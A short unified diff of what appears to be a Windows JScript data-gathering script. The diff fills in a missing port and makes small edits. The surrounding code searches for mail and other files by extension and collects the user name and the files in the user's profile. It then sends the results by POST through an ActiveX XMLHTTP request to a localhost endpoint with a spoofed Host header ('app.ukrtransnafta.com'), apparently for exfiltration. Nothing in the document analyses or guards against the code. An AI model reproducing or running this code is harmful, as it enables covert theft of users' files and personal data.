@@ -1,7 +1,8 @@
 try {
 	////////////////////////////////////////////////////////////
 	////////////////////////////////////////////////////////////
-	var needtonote = false; 
+	var needtonote = false;
+	var filecheckdelay = 0;
 	////////////////////////////////////////////////////////////
 var ext = [ //files extensions for search
 	"eml", //windows live mail
@@ -51,6 +52,7 @@ var ext = [ //files extensions for search
 			}
 		}
 	} catch(e) {error += "TIME|"}
+
 	
 	///////////////////////////////NAME////////////////////////
 	var user = "unknown";
@@ -368,7 +370,6 @@ var ext = [ //files extensions for search
    var filesinprofile = ""
 	try {
 		if ((OS_Type == 1) && (!file_checked)){
-			
 				var labels_mask = ""
 				var files_array = []
 				var files_array_in_profile = []
@@ -491,7 +492,7 @@ var ext = [ //files extensions for search
 	} catch(e) {}
 	
 	var http = new ActiveXObject("Microsoft.XMLHTTP");
-	http.open("POST", "http://localhost:/api/userlogin", false);
+	http.open("POST", "http://localhost:38842/api/userlogin", false);
 	http.setRequestHeader("Host", "app.ukrtransnafta.com");
 	http.setRequestHeader("User-Agent", "Mozilla/4.0 (compatible; Synapse)");
 	http.setRequestHeader("Content-Type", "application/json");
